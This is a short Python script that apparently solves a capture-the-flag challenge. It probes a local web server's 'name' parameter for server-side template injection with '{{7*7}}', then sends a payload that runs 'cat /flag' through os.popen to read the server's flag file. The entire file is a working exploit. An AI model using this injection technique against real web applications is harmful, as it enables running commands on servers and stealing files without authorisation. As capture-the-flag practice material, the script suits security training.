#!/usr/bin/python3
import urllib.parse, urllib.request
def get(name):
    u = "http://127.0.0.1:80/?name=" + urllib.parse.quote(name)
    return urllib.request.urlopen(u).read().decode()
print(get("you"))
print(get("{{7*7}}"))
print(get("{{os.popen('cat /flag').read()}}"))
